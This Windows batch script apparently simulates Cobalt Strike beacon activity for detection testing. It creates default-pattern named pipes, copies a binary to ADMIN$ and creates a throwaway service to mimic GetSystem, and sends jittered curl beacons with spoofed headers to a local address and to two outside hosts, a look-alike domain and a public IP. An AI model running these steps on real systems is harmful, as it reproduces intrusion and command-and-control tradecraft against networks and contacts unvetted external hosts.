@ECHO OFF

ECHO ===========================================================================
ECHO Simulate CobaltStrike Beacon Activity
ping -n 3 127.0.0.1 > NUL

"%ZIP%" e -p%PASS% "%TOOLARCH%" -aoa -o"%APTDIR%" toolset\CreateNamedPipe.exe > NUL

ECHO.
ECHO --- Create some default Named Pipes ...
ping -n 2 127.0.0.1 > NUL

ECHO Creating Named Pipe number 1: MSSE-1337-server
start "" "%APTDIR%\CreateNamedPipe.exe" MSSE-1337-server
timeout /t 5
ECHO Killing named pipe creator for pipe 1
taskkill /IM CreateNamedPipe.exe /F

ECHO Creating Named Pipe number 2 (P2P communication): msagent_fedac123
start "" "%APTDIR%\CreateNamedPipe.exe" msagent_fedac123
timeout /t 5
ECHO Killing named pipe creator for pipe 2
taskkill /IM CreateNamedPipe.exe /F

ECHO Creating Named Pipe number 3 (Post Exploitation): postex_ssh_fedac123
start "" "%APTDIR%\CreateNamedPipe.exe" postex_ssh_fedac123
timeout /t 5
ECHO Killing named pipe creator for pipe 3
taskkill /IM CreateNamedPipe.exe /F

ECHO Creating Named Pipe number 3 (Post Exploitation): postex_ssh_fedac123
start "" "%APTDIR%\CreateNamedPipe.exe" postex_ssh_fedac123
timeout /t 5
ECHO Killing named pipe creator for pipe 3
taskkill /IM CreateNamedPipe.exe /F

ECHO.
ECHO --- Simulating GetSystem ...
ping -n 2 127.0.0.1 > NUL
start "" "%APTDIR%\CreateNamedPipe.exe" 334485
timeout /t 2
ECHO Copy a service binary file to a suspicious location ...
ECHO Using Post-CobaltStrike 4.2 scheme
copy "%APTDIR%\CreateNamedPipe.exe" \\%COMPUTERNAME%\ADMIN$\b6a1458f396.exe
ECHO Starting suspicious service
sc create tbbd05 binpath= "%%COMSPEC%% /c echo b6a1458f396 > \\.\pipe\334485" DisplayName= "tbbd05" start= demand
sc start tbbd05 
sc stop tbbd05 
sc delete tbbd05 
timeout /t 2
ECHO Killing named pipe creator
taskkill /IM CreateNamedPipe.exe /F

:BEACONING
ECHO. 
ECHO --- HTTP Beaconing 1
ECHO Simulating HTTP beaconing - this step takes up to an hour to complete
ECHO.

ECHO Beacon 1 - HTTP 30s+50% Jitter http://10.0.2.15/pixel.gif
ping -n 2 127.0.0.1 > NUL
for /l %%x in (1, 1, 20) do (
    :: CURL requests
    ECHO Sending HTTP request ...
    "%CURL%" -s -o /dev/null -I ^
    -H "Accept: */*" ^
    -H "Cookie: cdoWQelsAYyUlsEMuvbfEAfSxSWtkRwhm5OPfZ6K+400BQBsFlxwSSvsZ2IokquiUDKEPTip7MHL5VkYirf74WkZkc29LeJIt38HQA8E79bc2x9wMgnCz7U5mWXTMZLCQPdoc0VNqbpd2ytuxKRm9upFlCgB41h3hu1GrfDt0Q0=" ^
    -A "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; BOIE9;ENUS)" ^
    -H "Connection: Keep-Alive" ^
    -H "Cache-Control: no-cache" ^
    http://10.0.2.15/pixel.gif
    SET /A RAND=!RANDOM!%%15+30
    timeout /t !RAND!
)

ECHO Beacon 2 - HTTPS 60s+30% Jitter https://operaa.net:443/jquery-3.2.2.min.js
ping -n 2 127.0.0.1 > NUL
for /l %%x in (1, 1, 20) do (
    :: CURL requests
    ECHO Sending HTTP request ...
    "%CURL%" -s -o /dev/null -I ^
    -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ^
    -H "Cache-Control: no-cache" ^
    -H "Connection: Keep-Alive" ^
    -H "Cookie: __cfduid=gjlAuOSb_vHdOfQwz0K2WU4g6D-a0pERCS6QV0Gur6nvsxFX0hRL7RxeK61hsQgk1uGySuIQxIDU364bLV9YRYQZxgxtkoYBqk2CBlJlqc_gSIm5fxgkUBdLttW19M0Pn7szdQMCLKKbUzAB9QRyG5W0OrUDroCUECuOf3HgwMU" ^
    -H "Referer: http://code.jquery.com/" ^
    -A "Mozilla/5.0 (Windows NT 5.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2832.7 Safari/537.36" ^
    https://operaa.net:443/jquery-3.2.2.min.js
    SET /A RAND=!RANDOM!%%20+50
    timeout /t !RAND!
)

ECHO Beacon 3 - HTTPS POST 100s+10% Jitter https://23.108.57.148:443/jquery-3.2.2.full.js?__cfduid=JldB6xdmcNseZHbaHmc
ping -n 2 127.0.0.1 > NUL
for /l %%x in (1, 1, 20) do (
    :: CURL requests
    ECHO Sending HTTP request ...
    "%CURL%" -s -o /dev/null -I ^
    -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ^
    --compressed ^
    -H "Cache-Control: no-cache" ^
    -H "Connection: Keep-Alive" ^
    -H "Referer: http://code.jquery.com/" ^
    -A "Mozilla/5.0 (Windows NT 5.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2832.7 Safari/537.36" ^
    --data-binary "LindJC4p3NQurUe49iXgZTH870jk49zueYbIoEOBXKAOG21gSewTXLq5cq5kWB6stOJ22kmBtmPvkGZ9DdVjgIaYuW2LgtnoBjBv_mfQ8BN-45S2gOENveMAsC4OhDv34K1cDbypDc9ml_jgsQEI8-7AckmshJSwuCREvoWfMtUsO1J29AJUPCCk3x_g0ABmPmLPIpaovUfSQcpOYnfQ3Sb1z0-2n2_S6WLF3KFVQZ_Sndmtpm-rrrF3Nu_Dzd1z7lieecuUYKTj4uGV8rbMsBES0hB-BydGJ3ohV0v5CIzkcPT7Ghp_0BwSlQKOLLMBvYlghCwW0OEqSLMqgnGxEnJhUfjrjtbfsgJamtcM_8ffsPC-YAZ6BLahZC67XXvVFaOdwB_z5GveFnmL5O1jBAXVGxJX6Qz9p4UHzcKCQDCocfU5C296ypYJ1or2mxq3qbnCOG6DVlk6x3duz39E_GmJIpRoDbvy5wIWCWL4hgCSrI-nOWx35M8sBU8BtxhmQCh_B5HYBQS4_muz87rb4SUebx_LlicWQTMgZcScg3xsGETFHL_GxciTUB3scKNVpgNsu6--ooIkFz7A2iT3qYIVg2dERaRNQsLSMnrty7echKPJ0YgKa9HhexcHasU4xrdlT2dRPs0-3mCn2YaadsrCdYrlSVUo" ^
    "https://23.108.57.148:443/jquery-3.2.2.full.js?__cfduid=JldB6xdmcNseZHbaHmc" 
    SET /A RAND=!RANDOM!%%10+100
    timeout /t !RAND!
)
